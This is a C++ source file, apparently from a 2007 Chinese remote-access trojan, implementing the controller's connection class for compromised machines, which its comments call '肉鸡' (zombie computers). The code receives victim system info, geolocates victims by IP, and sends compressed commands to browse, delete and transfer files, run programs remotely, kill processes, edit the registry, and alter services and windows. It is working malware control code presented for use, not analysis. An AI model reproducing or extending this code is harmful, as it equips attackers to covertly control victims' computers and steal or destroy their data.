// MyTrans.cpp: implementation of the MyServerTran class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "MyServerTran.h"
#include "lzw.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

MyServerTran::MyServerTran()
{
	// 获得本机代码页 [9/16/2007 zhaiyinwei]
	m_nMineCodePage = GetACP();
	m_Socket = NULL;
	m_IsProxy = FALSE;
	ZeroMemory(m_IpAddr, sizeof(m_IpAddr));
	ZeroMemory(m_RealAddr, sizeof(m_RealAddr));
	m_Port = 0;
	ZeroMemory(&m_LoginInfo, sizeof(LOGININFO));
	m_IsCheck = FALSE;
	ZeroMemory(m_Title, sizeof(m_Title));
	ZeroMemory(m_Id, sizeof(m_Id));	
	ZeroMemory(m_ViewName, sizeof(m_ViewName));
	ZeroMemory(m_ProxyIp, sizeof(m_ProxyIp));
}

MyServerTran::~MyServerTran()
{
	closesocket(m_Socket);
}

SOCKET MyServerTran::GetSafeSocket()
{
	return m_Socket;
}

//发送数据
BOOL MyServerTran::TcpSendDataMouse(LPVOID data)
{
	return (send(m_Socket, (char*) data, sizeof(MOUSEINFO), 0) > 0);
}

//发送数据
BOOL MyServerTran::TcpSendData(LPVOID data, DWORD len)
{
	char* p = (char*) data;
	DWORD i = 0;
	int k = (int) len;
	int ret = 0;

	if(m_Socket == NULL)
	{
		return FALSE;
	}

	while(i < len)
	{
		ret = send(m_Socket, p, k, 0);
		if(ret <= 0)
		{
			return FALSE;
		}

		i += ret;
		p += ret;
		k -= ret;
	}
	return TRUE;
}

//接收数据
BOOL MyServerTran::TcpRecvData(LPVOID data, DWORD len)
{
	char* p = (char*) data;
	DWORD i = 0;
	int k = (int) len;
	int ret = 0;

	if(m_Socket == NULL)
	{
		return FALSE;
	}

	while(i < len)
	{
		ret = recv(m_Socket, p, k, 0);
		if(ret <= 0)
		{
			return FALSE;
		}

		i += ret;
		p += ret;
		k -= ret;
	}
	return TRUE;
}

LPCTSTR MyServerTran::GetTitle()
{
	return m_Title;
}

LPCTSTR MyServerTran::GetViewName()
{
	return m_ViewName;
}

LPCTSTR MyServerTran::GetId()
{
	return m_Id;
}

LPCTSTR MyServerTran::GetNote()
{
	return m_Note;
}

LPCTSTR MyServerTran::GetRealAddr()
{
	return m_RealAddr;
}

void MyServerTran::SetNote(LPCTSTR sNote)
{
	lstrcpy(m_Note, sNote);
}

void MyServerTran::SetViewName(LPCTSTR sViewName)
{
	lstrcpy(m_ViewName, sViewName);
}

LPLOGININFO MyServerTran::GetLoginInfo()
{
	return &m_LoginInfo;
}

void MyServerTran::SetUnBlock(HWND hWnd)
{
	//启动套接字关闭事件通知
	WSAAsyncSelect(m_Socket, hWnd, WM_TRANEVENT, FD_CLOSE);
}

BOOL MyServerTran::DuplicateHttpSocket(LPTCPCONNECTINFO pInfo)
{
	m_Socket = WSASocket(AF_INET, SOCK_STREAM, 0, &pInfo->m_SocketInfo, 0, WSA_FLAG_OVERLAPPED);
	if(m_Socket == INVALID_SOCKET)
	{
		return FALSE;
	}

	BOOL nodelayval = TRUE;
	if(setsockopt(m_Socket, IPPROTO_TCP, TCP_NODELAY, (const char *) &nodelayval, sizeof(BOOL)))
	{
		return FALSE;
	}

	int one = 1;
	if (setsockopt(m_Socket, SOL_SOCKET, SO_KEEPALIVE, (char *)&one, sizeof(one)))
    {
		closesocket(m_Socket); 
		return NULL;
    }

	one = 3600 * 1000;
	if (setsockopt(m_Socket, SOL_SOCKET, SO_RCVTIMEO, (char *)&one, sizeof(one)))
    {
		closesocket(m_Socket); 
		return NULL;
    }

	one = 3600 * 1000;
	if (setsockopt(m_Socket, SOL_SOCKET, SO_SNDTIMEO, (char *)&one, sizeof(one)))
    {
		closesocket(m_Socket); 
		return NULL;
    }

	CopyMemory(&m_LoginInfo, &pInfo->m_SysInfo, sizeof(LOGININFO));
	lstrcpy(m_ProxyIp, pInfo->m_RealIp);
	FillMyInfo();
	return TRUE;
}

void MyServerTran::FillMyInfo()
{
	// 修改ID [9/20/2007 zhaiyinwei]
	//虽然m_LoginInfo.m_Id定义的是TCHAR，但是从肉鸡端过来的就是ANSI的。
	char m_TmpStr[256] = {0};
	BcdToAsc((BYTE*) (char*) m_LoginInfo.m_Id, (BYTE*) m_TmpStr, 16);
	MultiByteToWideChar(CP_ACP, 0, m_TmpStr, lstrlenA(m_TmpStr) + 1, m_Id, 256);

	// 不需要转换，否则在拷贝过程中会Convert2Unicode许多次 [9/20/2007 zhaiyinwei]
	//m_Id是控制端写到肉鸡文件末尾的，肉鸡端没有做改变，因此用本机的代码页转换  [9/20/2007 zhaiyinwei]
	//Convert2Unicode((char*)m_LoginInfo.m_Id,strlen((char*)m_LoginInfo.m_Id),GetACP());

	//取客户信息
	sockaddr_in m_addr = {0};
	int	addrlen = sizeof(sockaddr_in);
	if(lstrlen(m_ProxyIp) > 0)
	{
		lstrcpy(m_Title, m_ProxyIp);
		char m_TmpStr[256] = {0};
		WideCharToMultiByte(CP_ACP, 0, m_ProxyIp, lstrlen(m_ProxyIp) + 1 , m_TmpStr, 255, NULL, NULL);
		char* pFind = strrchr(m_TmpStr, ':');
		if(pFind != NULL)
		{
			*pFind = 0;
		}
		*((DWORD*) &m_addr.sin_addr) = inet_addr(m_TmpStr);
	}
	else
	{
		//用户标题
		getpeername(m_Socket, (sockaddr*) &m_addr, &addrlen);
		wsprintfA(m_TmpStr, "%s:%d", inet_ntoa(m_addr.sin_addr), m_addr.sin_port);
		MultiByteToWideChar(CP_ACP, 0, m_TmpStr, lstrlenA(m_TmpStr) + 1, m_Title, 256);
	}

	//客户标识
	GetUserInfo(m_Id, m_Note, PS_INFO_NOTE);
	if(lstrlen(m_Note) == 0)
	{
		lstrcpy(m_Note, m_LoginInfo.m_Note);
		if(lstrlen(m_Note) == 0)
		{
			lstrcpy(m_Note, m_LoginInfo.m_PcName);
		}
	}

	//用户分组
	GetUserInfo(m_Id, m_ViewName, PS_INFO_VIEW);
	if(lstrlen(m_ViewName) == 0)
	{
		lstrcpy(m_ViewName, m_LoginInfo.m_Group);
		if(lstrlen(m_ViewName) == 0)
		{
			lstrcpy(m_ViewName, PS_PUTONGKEHUZU);
		}
	}

	//客户所在地
	TCHAR m_FileName[256] = _T("QQWry.dat");
	GetBinFilePath(m_FileName);
	BYTE m_Ip[4] = {0};
	m_Ip[0] = m_addr.sin_addr.S_un.S_un_b.s_b1;
	m_Ip[1] = m_addr.sin_addr.S_un.S_un_b.s_b2;
	m_Ip[2] = m_addr.sin_addr.S_un.S_un_b.s_b3;
	m_Ip[3] = m_addr.sin_addr.S_un.S_un_b.s_b4;
	if(LocalityFromIP2(m_Ip, m_FileName, m_RealAddr) != 0)
	{
		lstrcpy(m_RealAddr, _T("未知地点"));
	}
}

BOOL MyServerTran::CreateSocket(SOCKET s, BOOL bIsProxy)
{
	m_Socket = s;
	m_IsProxy = bIsProxy;

	BOOL nodelayval = TRUE;
	if (setsockopt(m_Socket, IPPROTO_TCP, TCP_NODELAY, (const char *) &nodelayval, sizeof(BOOL)))
	{
		closesocket(m_Socket); 
		return NULL;
	}

	int one = 1;
	if (setsockopt(m_Socket, SOL_SOCKET, SO_KEEPALIVE, (char *)&one, sizeof(one)))
    {
		closesocket(m_Socket); 
		return NULL;
    }

	one = 300 * 1000;
	if (setsockopt(m_Socket, SOL_SOCKET, SO_RCVTIMEO, (char *)&one, sizeof(one)))
    {
		closesocket(m_Socket); 
		return NULL;
    }

	one = 300 * 1000;
	if (setsockopt(m_Socket, SOL_SOCKET, SO_SNDTIMEO, (char *)&one, sizeof(one)))
    {
		closesocket(m_Socket); 
		return NULL;
    }

	if(m_IsProxy)
	{
		//接收实际地址信息
		if(!TcpRecvData(m_ProxyIp, 22))
		{
			closesocket(m_Socket); 
			return NULL;
		}
		Convert2Unicode((char*) m_ProxyIp, strlen((char*) m_ProxyIp), GetACP());
	}

	//接收包数据
	if(!TcpRecvData(&m_LoginInfo, sizeof(LOGININFO)))
	{
		closesocket(m_Socket); 
		return NULL;
	}
	EncryptByte(&m_LoginInfo, sizeof(LOGININFO));

	m_LoginInfo.m_ACP = GetACP();
	m_LoginInfo.m_OEMCP = GetOEMCP();

	if(m_LoginInfo.m_UserId != PS_USER_ID)
	{
		//非法版本
		return FALSE;
	}

//////////////////////////////////////////////////////////////////////////
// 多语种转换 [9/20/2007 zhaiyinwei]
// 控制端在生成肉鸡时，往文件末尾写的结构是控制端的纯ANSI结构，不是肉鸡端的ANSI结构
#ifdef UNICODE
	// 下面这几个变量是控制端写到肉鸡文件末尾的，肉鸡端没有做改变，因此用本机的代码页转换
	Convert2Unicode((char*)m_LoginInfo.m_Group,strlen((char*)m_LoginInfo.m_Group),GetACP());
	Convert2Unicode((char*)m_LoginInfo.m_SoftVer,strlen((char*)m_LoginInfo.m_SoftVer),GetACP());
	// m_Note 有可能是控制端带过去的，也有可能是肉鸡端用m_PcName代替的
	if (strcmp((char*)m_LoginInfo.m_Note,(char*)m_LoginInfo.m_PcName) == 0)
		Convert2Unicode((char*)m_LoginInfo.m_Note,strlen((char*)m_LoginInfo.m_Note),m_LoginInfo.m_ACP);
	else
		Convert2Unicode((char*)m_LoginInfo.m_Note,strlen((char*)m_LoginInfo.m_Note),GetACP());
	
	// 下面这个是从肉鸡取的，要用肉鸡端的代码页转换
	Convert2Unicode((char*)m_LoginInfo.m_PcName,strlen((char*)m_LoginInfo.m_PcName),m_LoginInfo.m_ACP);
#endif
//////////////////////////////////////////////////////////////////////////
	FillMyInfo();
	return TRUE;
}

const MyServerTran& MyServerTran::operator = (const MyServerTran& SrcTran)
{
	//拷贝套接字
	m_Socket = SrcTran.m_Socket;
	m_IsProxy = SrcTran.m_IsProxy;
	lstrcpy(m_IpAddr, SrcTran.m_IpAddr);
	lstrcpy(m_RealAddr, SrcTran.m_RealAddr);
	lstrcpy(m_Id, SrcTran.m_Id);
	m_Port = SrcTran.m_Port;
	CopyMemory(&m_LoginInfo, &SrcTran.m_LoginInfo, sizeof(LOGININFO));
	m_IsCheck = SrcTran.m_IsCheck;
	lstrcpy(m_Title, SrcTran.m_Title);				
	lstrcpy(m_ViewName, SrcTran.m_ViewName);
	return *this;
}

void MyServerTran::Close()
{
	if(m_Socket != NULL)
	{
		closesocket(m_Socket);
	}
	m_Socket = NULL;
	m_IsProxy = FALSE;
	ZeroMemory(m_IpAddr, sizeof(m_IpAddr));
	ZeroMemory(m_RealAddr, sizeof(m_RealAddr));
	m_Port = 0;
	ZeroMemory(&m_LoginInfo, sizeof(LOGININFO));
	m_IsCheck = FALSE;
	ZeroMemory(m_Title, sizeof(m_Title));
	ZeroMemory(m_Id, sizeof(m_Id));	
	ZeroMemory(m_ViewName, sizeof(m_ViewName));
}

BOOL MyServerTran::SendCmd(DWORD nCmd, HWND hWnd)
{
	CMDINFO m_CmdInfo = {0};
	m_CmdInfo.m_Command = nCmd;
	m_CmdInfo.m_Hwnd = hWnd;
	m_IsCheck = TRUE;

	TRACE(_T("m_Command = %d\n"), m_CmdInfo.m_Command);

	return TcpSendData(&m_CmdInfo, sizeof(CMDINFO));
}

void MyServerTran::SendAliveCmd()
{
	SendCmd(WM_CONNECT_QUER, NULL);
}

BOOL MyServerTran::CheckSocket(SOCKET s)
{
	return (m_Socket == s);
}

BOOL MyServerTran::CheckId(LPCTSTR sId)
{
	return (StrCmpI(sId, m_Id) == 0);
}

BOOL MyServerTran::CheckTitle(LPCTSTR sTitle)
{
	return (StrCmpI(sTitle, m_Title) == 0);
}

BOOL MyServerTran::IsInit()
{
	return (m_Socket != NULL);
}

BOOL MyServerTran::TranData(LPVOID InData, DWORD InLen, LPVOID OutData, DWORD OutLen)
{
	if(!TcpSendData(InData, InLen) || !TcpRecvData(OutData, OutLen))
	{
		return FALSE;
	}
	return TRUE;
}

BOOL MyServerTran::SendDataWithCmd(LPVOID pSendData, DWORD dSendLen, DWORD nCmd)
{
	// Unicode 版本需要做转换 [9/16/2007 zhaiyinwei]
	ConvertSendDataWithCmd( pSendData,  dSendLen, nCmd);

	BYTE* pZipData = NULL;
	if(pSendData != NULL && dSendLen != 0)
	{
		pZipData = new BYTE[dSendLen * 2 + 65535];
		ZeroMemory(pZipData, dSendLen * 2 + 65535);
		FCLzw lzw;
		lzw.PcZip((BYTE*) pSendData, (BYTE*) pZipData, &dSendLen);
	}
	else
	{
		pZipData = (BYTE*) pSendData;
	}

	//发送长度
	if(!TcpSendData(&dSendLen, sizeof(DWORD)))
	{
		if(pZipData != NULL && pZipData != pSendData)
		{
			delete [] pZipData;
		}
		return FALSE;
	}

	//发送命令
	if(!TcpSendData(&nCmd, sizeof(DWORD)))
	{
		if(pZipData != NULL && pZipData != pSendData)
		{
			delete [] pZipData;
		}
		return FALSE;
	}

	if(dSendLen == 0)
	{
		return TRUE;
	}

	BOOL bRet = TcpSendData(pZipData, dSendLen);
	if(pZipData != NULL && pZipData != pSendData)
	{
		delete [] pZipData;
	}
	return bRet;
}

BOOL MyServerTran::RecvDataWithCmd(LPBYTE* pRecvData, DWORD* dRecvLen, DWORD* dCmd)
{
	DWORD dwTranCmd = *dCmd;// 记录一下原命令ID [9/16/2007 zhaiyinwei]

	//接收长度
	DWORD dZipLen = 0;
	if(!TcpRecvData(&dZipLen, sizeof(DWORD)))
	{
		return FALSE;
	}

	//接收命令
	if(!TcpRecvData(dCmd, sizeof(DWORD)))
	{
		return FALSE;
	}

	if(dZipLen == 0)
	{
		*dRecvLen = 0;
		return TRUE;
	}

	//接收包数据
	BYTE* pZipData = new BYTE[dZipLen];
	if(!TcpRecvData(pZipData, dZipLen))
	{
		delete [] pZipData;
		return FALSE;
	}

	//原始长度
	*dRecvLen = *((DWORD*) &pZipData[12]);
	BYTE* pData = new BYTE[*dRecvLen + 65535];
	ZeroMemory(pData, *dRecvLen + 65535);

	FCLzw lzw;
	lzw.PcUnZip(pZipData, pData, dRecvLen);
	delete [] pZipData;
	*pRecvData = pData;

	// Unicode 版本需要做转换 [9/16/2007 zhaiyinwei]
	if(*dCmd == 0)//命令执行成功
	{
		ConvertRecvDataWithCmd( *pRecvData,  *dRecvLen, dwTranCmd);
	}
	return TRUE;
}

/************************************************************************/
/*    传输层 Unicode 转换
/************************************************************************/
// 转换接收到的内容为Unicode [9/16/2007 zhaiyinwei]
BOOL MyServerTran::ConvertRecvDataWithCmd(LPBYTE pRecvData, DWORD dRecvLen, DWORD dCmd)
{
#ifdef UNICODE
	switch(dCmd)
	{
	case CLIENT_DISK_INFO://取磁盘信息
		{
			LPDISKINFO pDiskInfo =(LPDISKINFO) 	pRecvData;

			DWORD nLen = strlen((char*)pDiskInfo->m_Volume);
			Convert2Unicode((char*)pDiskInfo->m_Volume,nLen,m_LoginInfo.m_ACP);

			nLen = strlen((char*)pDiskInfo->m_FileSys);
			Convert2Unicode((char*)pDiskInfo->m_FileSys,nLen,m_LoginInfo.m_ACP);

			nLen = strlen((char*)pDiskInfo->m_Name);
			Convert2Unicode((char*)pDiskInfo->m_Name,nLen,m_LoginInfo.m_ACP);
		}	
		break;
	case CLIENT_FILE_INFO://取文件信息
		{
			LPFILEINFO pFileInfo =(LPFILEINFO) 	pRecvData;
			DWORD len = strlen((char*)pFileInfo->m_szFullName);
			Convert2Unicode((char*)pFileInfo->m_szFullName,len,m_LoginInfo.m_ACP);
		}		
		break;
	case CLIENT_DIR_INFO://取目录信息
		{
			LPDIRINFO pDirInfo = (LPDIRINFO) pRecvData;
			DWORD len = strlen((char*)pDirInfo->m_szFullName);
			Convert2Unicode((char*)pDirInfo->m_szFullName,len,m_LoginInfo.m_ACP);
		}
	    break;
	case CLIENT_DIR_LIST://列举目录
		{
			int n = sizeof(WIN32_FILE_ATTRIBUTE_DATA);
			n += 512;
			LPDIRFILELIST pDirListItem = (LPDIRFILELIST) pRecvData;
			for(DWORD i = 0; i < dRecvLen / sizeof(DIRFILELIST); i++)
			{
				Convert2Unicode((char*)pDirListItem->m_ItemPath,strlen((char*)pDirListItem->m_ItemPath),m_LoginInfo.m_ACP);

				pDirListItem++;
			}
		}
		break;
	case CLIENT_DISK_LIST://取磁盘列表
		{
			//显示列表
			DWORD dwFileSize = dRecvLen;

			LPDISKINFO pItem = (LPDISKINFO) pRecvData;
			for(ULONG i = 0; i < (dwFileSize/sizeof(DISKINFO)); i++)
			{
				DWORD nLen = strlen((char*)pItem->m_Volume);
				Convert2Unicode((char*)pItem->m_Volume,nLen,m_LoginInfo.m_ACP);
				nLen = strlen((char*)pItem->m_FileSys);
				Convert2Unicode((char*)pItem->m_FileSys,nLen,m_LoginInfo.m_ACP);
				nLen = strlen((char*)pItem->m_Name);
				Convert2Unicode((char*)pItem->m_Name,nLen,m_LoginInfo.m_ACP);

				pItem++;
			}
		}
	    break;
	case CLIENT_FILE_DELETE://删除文件
		// 无返回值，不用处理。
		break;
	case CLIENT_CREATE_DIR://新建目录
		// 无返回值，不用处理。
		break;
	case CLIENT_RENAME://更名或新建
		// 无返回值，不用处理。
	    break;
	case CLIENT_EXEC_FILE://远程运行程序
		// 无返回值，不用处理。
	    break;
	case CLIENT_DOWN_FILE_LIST://客户目录拷贝列表
		{
			UINT m_Count = dRecvLen/sizeof(CPFILEINFO);
			LPCPFILEINFO pSrc = (LPCPFILEINFO) pRecvData;
			for(UINT i = 0; i < m_Count; i++)
			{
				DWORD nLen = strlen((char*)pSrc->m_FileName);
				Convert2Unicode((char*)pSrc->m_FileName,nLen,m_LoginInfo.m_ACP);

				pSrc++;
			}
		}
	    break;
	case CLIENT_FIND_FILE://查找文件
		{
			LPDIRFILELIST pItem = (LPDIRFILELIST) pRecvData;
			for(UINT i = 0; i < dRecvLen / sizeof(DIRFILELIST); i++)
			{
				DWORD nLen = strlen((char*)pItem->m_ItemPath);
				Convert2Unicode((char*)pItem->m_ItemPath,nLen,m_LoginInfo.m_ACP);

				pItem ++;
			}
		}
	    break;
	case CLIENT_PROCESS_KILL:		//终止用户进程
		// 无返回值，不用处理。
	    break;
	case CLIENT_REG_QUERY:		//查询指定键值
		{
			LPREGINFO pItem = (LPREGINFO) pRecvData;
			for(UINT i = 0; i < dRecvLen / sizeof(REGINFO); i++)
			{
				DWORD nLen = strlen((char*)pItem->m_Name);
				Convert2Unicode((char*)pItem->m_Name,nLen,m_LoginInfo.m_ACP);

				if(pItem->m_DataType == REG_SZ || pItem->m_DataType == REG_EXPAND_SZ)
				{
					pItem->m_Data[pItem->m_Datalen] = 0;
					DWORD nLen = strlen((char*)pItem->m_Data);
					Convert2Unicode((char*)pItem->m_Data,nLen,m_LoginInfo.m_ACP);
				}

				pItem ++;
			}
		}
		break;
	case CLIENT_REG_DELETE_KEY:		//删除子键
	case CLIENT_REG_DELETE_VALUE: 	//删除键值
	case CLIENT_REG_UPDATE_VALUE:		//更改键值
		// 无返回值，不用处理。
	    break;

	case CLIENT_PROCESS_LIST:		//刷新进程列表
		{
			LPPROCESSLIST pItem = (LPPROCESSLIST) pRecvData;
			for(UINT i = 0; i < dRecvLen / sizeof(PROCESSLIST); i++)
			{
				DWORD nLen = strlen((char*)pItem->szExeFile);
				Convert2Unicode((char*)pItem->szExeFile,nLen,m_LoginInfo.m_ACP);

				pItem ++;
			}
		}
		break;
	case CLIENT_ENUM_SERVICES:		//列举服务
		{
			LPMYSERVICES pItem = (LPMYSERVICES) pRecvData;
			for(UINT i = 0; i < dRecvLen / sizeof(MYSERVICES); i++)
			{
				DWORD nLen = strlen((char*)pItem->m_Name);
				Convert2Unicode((char*)pItem->m_Name,nLen,m_LoginInfo.m_ACP);

				nLen = strlen((char*)pItem->m_Disp);
				Convert2Unicode((char*)pItem->m_Disp,nLen,m_LoginInfo.m_ACP);

				nLen = strlen((char*)pItem->m_Status);
				Convert2Unicode((char*)pItem->m_Status,nLen,m_LoginInfo.m_ACP);

				nLen = strlen((char*)pItem->lpBinaryPathName);
				Convert2Unicode((char*)pItem->lpBinaryPathName,nLen,m_LoginInfo.m_ACP);

				nLen = strlen((char*)pItem->lpLoadOrderGroup);
				Convert2Unicode((char*)pItem->lpLoadOrderGroup,nLen,m_LoginInfo.m_ACP);

				nLen = strlen((char*)pItem->lpDependencies);
				Convert2Unicode((char*)pItem->lpDependencies,nLen,m_LoginInfo.m_ACP);

				nLen = strlen((char*)pItem->lpServiceStartName);
				Convert2Unicode((char*)pItem->lpServiceStartName,nLen,m_LoginInfo.m_ACP);

				nLen = strlen((char*)pItem->lpDisplayName);
				Convert2Unicode((char*)pItem->lpDisplayName,nLen,m_LoginInfo.m_ACP);

				nLen = strlen((char*)pItem->lpDescribe);
				Convert2Unicode((char*)pItem->lpDescribe,nLen,m_LoginInfo.m_ACP);

				nLen = strlen((char*)pItem->lpPassword);
				Convert2Unicode((char*)pItem->lpPassword,nLen,m_LoginInfo.m_ACP);

				pItem ++;
			}
		}
		break;
	case CLIENT_CONTROL_SERVICES:		//控制服务
		// 无返回值，不用处理。
	    break;

	case CLIENT_CONFIG_SERVICES:		//更新服务属性
		// 无返回值，不用处理。
		break;
	case CLIENT_DELETE_SERVICE:		//删除服务
		// 无返回值，不用处理。
		break;
	case CLIENT_ENUM_WINDOWS:		//枚举窗口
		{
			LPWINDOWITEM pItem = (LPWINDOWITEM) pRecvData;
			for(UINT i = 0; i < dRecvLen / sizeof(WINDOWITEM); i++)
			{
				DWORD nLen = strlen((char*)pItem->m_ProcName);
				Convert2Unicode((char*)pItem->m_ProcName,nLen,m_LoginInfo.m_ACP);

				nLen = strlen((char*)pItem->m_WndName);
				Convert2Unicode((char*)pItem->m_WndName,nLen,m_LoginInfo.m_ACP);

				pItem ++;
			}
		}
		break;
	case CLIENT_CONTROL_WINDOWS:		//控制窗口
		// 无返回值，不用处理。
		break;
	case CLIENT_FILE_TRAN:		//传输文件
		// 仅通知肉鸡开始文件传输，此时只传递了文件传输对话框的窗口句柄
		break;
	default:
	    break;
	}
#endif
	return TRUE;
}
// 转换发送的内容为肉鸡端ANSI [9/16/2007 zhaiyinwei]
BOOL MyServerTran::ConvertSendDataWithCmd(LPVOID pSendData, DWORD dSendLen, DWORD nCmd)
{
#ifdef UNICODE
	switch(nCmd)
	{
	case CLIENT_DISK_INFO://取磁盘信息
	case CLIENT_FILE_INFO://取文件信息
	case CLIENT_DIR_INFO://取目录信息
	case CLIENT_DIR_LIST://列举目录
	case CLIENT_CREATE_DIR://新建目录	
	case CLIENT_FIND_FILE://查找文件
	case CLIENT_EXEC_FILE://远程运行程序,实现有变化：原来的版本是两个参数，第二个参数是运行方式
	case CLIENT_PROCESS_KILL:		//终止用户进程
		{
			LPPATHFILEITEM pItem = (LPPATHFILEITEM) pSendData;
			Convert2ClientANSI(pItem->m_FileName,wcslen(pItem->m_FileName),m_LoginInfo.m_ACP);
		}
		break;

	case CLIENT_DOWN_FILE_LIST://客户目录拷贝列表，这个跟原来的版本也有变化
	case CLIENT_FILE_DELETE://删除文件
		{
			//传递的是一个删除列表
			DWORD dwFileSize = dSendLen;

			LPDIRFILELIST pItem = (LPDIRFILELIST) pSendData;
			for(ULONG i = 0; i < (dwFileSize/sizeof(DIRFILELIST)); i++)
			{
				Convert2ClientANSI(pItem->m_ItemPath,wcslen(pItem->m_ItemPath),m_LoginInfo.m_ACP);

				pItem++;
			}
		}
		break;
	case CLIENT_DISK_LIST://取磁盘列表
		// 0字节，不需要转换
	    break;

	case CLIENT_RENAME://更名或新建
		{
			LPRENAMEFILEITEM pItem = (LPRENAMEFILEITEM) pSendData;
			Convert2ClientANSI(pItem->m_NewFileName,wcslen(pItem->m_NewFileName),m_LoginInfo.m_ACP);
			Convert2ClientANSI(pItem->m_OldFileName,wcslen(pItem->m_OldFileName),m_LoginInfo.m_ACP);
		}
		break;
	
	case CLIENT_REG_QUERY:		//查询指定键值
	case CLIENT_REG_DELETE_KEY:		//删除子键
	case CLIENT_REG_DELETE_VALUE: 	//删除键值
	case CLIENT_REG_UPDATE_VALUE:		//更改键值
		{
			LPPSREGINFO		pRegItem = (LPPSREGINFO) pSendData;
			Convert2ClientANSI(pRegItem->m_ItemName,wcslen(pRegItem->m_ItemName),m_LoginInfo.m_ACP);
			Convert2ClientANSI(pRegItem->m_Key,wcslen(pRegItem->m_Key),m_LoginInfo.m_ACP);
			if(pRegItem->m_ItemType != REG_DWORD)
			{
				Convert2ClientANSI((wchar_t*)pRegItem->m_ItemValue,wcslen((wchar_t*)pRegItem->m_ItemValue),m_LoginInfo.m_ACP);
			}
		}
		break;	

	case CLIENT_PROCESS_LIST:		//刷新进程列表
	case CLIENT_ENUM_SERVICES:		//列举服务
		// 0字节，不需要转换
	    break;
	
	case CLIENT_CONTROL_SERVICES:		//控制服务
	case CLIENT_DELETE_SERVICE:		//删除服务
		{
			LPCONTROLSERVICES		pItem = (LPCONTROLSERVICES) pSendData;
			Convert2ClientANSI(pItem->m_Name,wcslen(pItem->m_Name),m_LoginInfo.m_ACP);
		}
		break;
	case CLIENT_CONFIG_SERVICES:		//更新服务属性
		{
			LPMYSERVICES pItem = (LPMYSERVICES) pSendData;

			DWORD nLen = wcslen(pItem->m_Name);
			Convert2ClientANSI(pItem->m_Name,nLen,m_LoginInfo.m_ACP);

			nLen = wcslen(pItem->m_Disp);
			Convert2ClientANSI(pItem->m_Disp,nLen,m_LoginInfo.m_ACP);

			nLen = wcslen(pItem->m_Status);
			Convert2ClientANSI(pItem->m_Status,nLen,m_LoginInfo.m_ACP);

			nLen = wcslen(pItem->lpBinaryPathName);
			Convert2ClientANSI(pItem->lpBinaryPathName,nLen,m_LoginInfo.m_ACP);

			nLen = wcslen(pItem->lpLoadOrderGroup);
			Convert2ClientANSI(pItem->lpLoadOrderGroup,nLen,m_LoginInfo.m_ACP);

			nLen = wcslen(pItem->lpDependencies);
			Convert2ClientANSI(pItem->lpDependencies,nLen,m_LoginInfo.m_ACP);

			nLen = wcslen(pItem->lpServiceStartName);
			Convert2ClientANSI(pItem->lpServiceStartName,nLen,m_LoginInfo.m_ACP);

			nLen = wcslen(pItem->lpDisplayName);
			Convert2ClientANSI(pItem->lpDisplayName,nLen,m_LoginInfo.m_ACP);

			nLen = wcslen(pItem->lpDescribe);
			Convert2ClientANSI(pItem->lpDescribe,nLen,m_LoginInfo.m_ACP);

			nLen = wcslen(pItem->lpPassword);
			Convert2ClientANSI(pItem->lpPassword,nLen,m_LoginInfo.m_ACP);

		}
		break;
	
	case CLIENT_ENUM_WINDOWS:		//枚举窗口
		// 0字节，不需要转换
	    break;
	case CLIENT_CONTROL_WINDOWS:		//控制窗口
		{
			LPWINDOWITEM		pItem = (LPWINDOWITEM) pSendData;
			Convert2ClientANSI(pItem->m_ProcName,wcslen(pItem->m_ProcName),m_LoginInfo.m_ACP);
			Convert2ClientANSI(pItem->m_WndName,wcslen(pItem->m_WndName),m_LoginInfo.m_ACP);
		}
		break;
	case CLIENT_FILE_TRAN:		//传输文件
		// 仅通知肉鸡开始文件传输，此时只传递了文件传输对话框的窗口句柄
		break;
	default:
	    break;
	}
#endif
	return TRUE;
}

// 按代码页转换字符串
int MyServerTran::CodePageConvert(char* pszData, DWORD &nDataLen, int nSrcCodePage,int nDestCodePage)
{
	if (nSrcCodePage == -1 || nDestCodePage == -1 || nSrcCodePage == nDestCodePage)
	{
		return nDataLen;
	}

	int nWCharLen = MultiByteToWideChar(nSrcCodePage, 0, pszData, nDataLen ,NULL, 0);

	wchar_t * pwszUnicode = new wchar_t[nWCharLen];
	memset(pwszUnicode, 0, nWCharLen);

	MultiByteToWideChar(nSrcCodePage, 0, pszData, nDataLen, pwszUnicode, nWCharLen);

	nDataLen = WideCharToMultiByte(nDestCodePage, 0, pwszUnicode, nWCharLen, NULL, 0, NULL, NULL); 

	char* pszDest = new char[nDataLen];
	memset(pszDest, 0, nDataLen);

	WideCharToMultiByte(nDestCodePage, 0, pwszUnicode, nWCharLen , pszDest, nDataLen, NULL, NULL);

	memcpy(pszData,pszDest,nDataLen);
	pszData[nDataLen] = '\0';

	delete [] pwszUnicode;
	delete [] pszDest; 

	return strlen(pszData);
}

int MyServerTran::Convert2Unicode(char* pszData, DWORD nDataLen, int nSrcCodePage)
{
	if (nSrcCodePage == -1 || nDataLen == 0)
	{
		return nDataLen;
	}
	if (nSrcCodePage == -2)
	{
		nSrcCodePage = m_LoginInfo.m_ACP;
	}

	int nWCharLen = MultiByteToWideChar(nSrcCodePage, 0, pszData, nDataLen ,NULL, 0);

	wchar_t * pwszUnicode = new wchar_t[nWCharLen];
	memset(pwszUnicode, 0, nWCharLen);

	int nWDataLen = MultiByteToWideChar(nSrcCodePage, 0, pszData, nDataLen, pwszUnicode, nWCharLen);

	memcpy(pszData,pwszUnicode,nWDataLen*sizeof(wchar_t));
	wchar_t *pTmp = (wchar_t*)pszData;
	pTmp[nWDataLen] = L'\0';

	delete [] pwszUnicode;

	return wcslen(pTmp);
}

int MyServerTran::Convert2ClientANSI(wchar_t* pwszUnicode, DWORD nWCharLen, int nClientCodePage)
{
	if (nClientCodePage == -1 || nWCharLen == 0)
	{
		return nWCharLen;
	}
	if (nClientCodePage == -2)
	{
		nClientCodePage = m_LoginInfo.m_ACP;
	}

	int nDataLen = WideCharToMultiByte(nClientCodePage, 0, pwszUnicode, nWCharLen, NULL, 0, NULL, NULL); 

	char* pszDest = new char[nDataLen];
	memset(pszDest, 0, nDataLen);

	WideCharToMultiByte(nClientCodePage, 0, pwszUnicode, nWCharLen , pszDest, nDataLen, NULL, NULL);

	char* pszData = reinterpret_cast <char*>(pwszUnicode);
	memcpy(pszData,pszDest,nDataLen);
	pszData[nDataLen] = '\0';

	delete [] pszDest; 

	return strlen(pszData);
}